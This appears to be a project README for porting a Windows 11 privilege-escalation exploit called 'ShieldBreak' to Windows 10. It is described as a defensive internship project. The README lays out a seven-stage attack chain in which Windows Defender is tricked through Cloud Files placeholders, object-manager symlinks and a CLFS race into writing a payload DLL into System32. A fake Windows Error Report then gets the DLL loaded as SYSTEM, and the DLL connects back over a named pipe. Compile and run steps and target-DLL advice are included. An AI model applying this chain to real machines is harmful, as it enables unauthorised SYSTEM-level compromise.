# ShieldBreak Win10 Port
## ASI Internship Project - Rainfantry

**Goal:** Port MSNightmare's ShieldBreak (Win11 0day) to Windows 10 for ASI's defensive toolkit.

**Status:** Stage 1 PASSED ✓ — Cloud Files API confirmed working on Win10 19045

---

## Quick Start (Tested & Working)

### Prerequisites
- Windows 10 VM (tested on build 19045/26200)
- Visual Studio 2022 with C++ tools
- Standard user account (NOT admin)

### Step 1: Clone
```cmd
cd C:\Phantom
git clone https://github.com/rainfantry/shieldbreak-win10.git
cd shieldbreak-win10\win10-port
```

### Step 2: Compile Stage Tests
```cmd
cl.exe stage1_test_cloudfiles.cpp /Fe:stage1_test.exe /link CldApi.lib ole32.lib
cl.exe stage2_test_objmgr.cpp /Fe:stage2_test.exe /link ntdll.lib
```

### Step 3: Run Tests (as standard user)
```cmd
stage1_test.exe
stage2_test.exe
```

---

## The Exploit Chain (7 Stages)

ShieldBreak chains multiple Windows internals techniques:

### Stage 1: Cloud Files Provider ✓ TESTED
```
CfRegisterSyncRoot() → Fake OneDrive-style sync provider
CfCreatePlaceholders() → Create "cloud" file that hydrates on access
```
- Uses Windows Cloud Files API (CldApi.dll)
- Available since Win10 1709
- **WIN10 STATUS: WORKING**

### Stage 2: Object Manager Namespaces
```
\BaseNamedObjects\Restricted\WD_TARGET_<guid>\
\BaseNamedObjects\Restricted\WD_SHADOW_<guid>\WD_SCAN → symlink
```
- Creates directories in kernel object namespace
- Standard user can create in `Restricted\` subdirectory
- Sets up symbolic links for path redirection

### Stage 3: Windows Defender Scan Trigger
```
MpManagerOpen() → Connect to Defender via MpClient.dll
MpScanStart() → Trigger scan on placeholder file
```
- Triggers Defender to scan our fake cloud file
- Defender follows symlinks into our controlled directory
- Creates CLFS log files as side effect

### Stage 4: CLFS Race Condition
```
ReadDirectoryChangesW() → Watch for CLFS file creation
LockFileEx() → Lock the CLFS log mid-operation
Swap symlink → Redirect to target DLL
```
- Race to catch Defender mid-scan
- Lock CLFS log to hold operation in limbo
- Swap symlink target to system DLL location

### Stage 5: DLL Payload Write
```
CfHydratePlaceholder() → "Hydrate" with Warden.dll content
Target: C:\Windows\System32\phoneinfo.dll:stream
```
- Defender's file operation gets redirected
- Writes payload to SYSTEM-writable location
- Uses NTFS alternate data stream

### Stage 6: WER Task Trigger
```
Create: C:\ProgramData\Microsoft\Windows\WER\ReportQueue\Kernel_...\Report.wer
ITaskService → Run "QueueReporting" scheduled task
```
- Creates fake Windows Error Report
- WER task runs as SYSTEM
- Processes our report, loads payload

### Stage 7: SYSTEM Shell
```
CreateNamedPipe("\\.\pipe\SHIELDBREAK")
Warden.dll → Connects back via pipe
```
- Payload DLL connects to our named pipe
- SYSTEM privileges achieved

---

## Win10 vs Win11 Differences

### Known Issue: phoneinfo.dll
```cpp
// ShieldBreak checks this first
if (GetFileAttributes(L"C:\\Windows\\System32\\phoneinfo.dll") != INVALID_FILE_ATTRIBUTES)
{
    printf("Delete phoneinfo.dll fucktard.\n");
    return 1;
}
```

| Version | phoneinfo.dll | Action Required |
|---------|---------------|-----------------|
| Win11 | Doesn't exist | Exploit creates it |
| Win10 | May exist | Find alternative target |

### Check on your VM:
```cmd
dir C:\Windows\System32\phoneinfo.dll
```

If it exists, we need an alternative DLL target that:
- Doesn't exist by default
- Gets loaded by a SYSTEM process
- Can be written via the same technique

---

## File Structure

```
shieldbreak-win10/
├── README.md                          ← This file
├── original/
│   ├── ShieldBreak.cpp                ← MSNightmare's Win11 source
│   ├── Report.wer                     ← WER report template
│   └── Warden_payload.cpp             ← Payload DLL template
├── win10-port/
│   ├── stage1_test_cloudfiles.cpp     ← Cloud Files API test ✓
│   ├── stage2_test_objmgr.cpp         ← Object Manager test
│   ├── stage3_test_defender.cpp       ← Defender scan test
│   └── shieldbreak_win10.cpp          ← Final ported exploit
└── analysis/
    └── notes.md                       ← Research notes
```

---

## Testing Progress

| Stage | Component | Win10 Status |
|-------|-----------|--------------|
| 1 | Cloud Files API | ✓ PASSED |
| 2 | Object Manager | TESTING |
| 3 | Defender Scan | PENDING |
| 4 | CLFS Race | PENDING |
| 5 | DLL Write | PENDING |
| 6 | WER Trigger | PENDING |
| 7 | Shell Callback | PENDING |

---

## References

- Original ShieldBreak: https://github.com/MSNightmare/ShieldBreak
- RoguePlanet (CVE-2026-50656): https://github.com/MSNightmare/RoguePlanet
- Cloud Files API: https://docs.microsoft.com/en-us/windows/win32/api/cfapi/
- CLFS Documentation: https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-the-common-log-file-system

---

## Credits

- **MSNightmare (ASI)** — Original ShieldBreak research
- **Rainfantry** — Win10 port adaptation
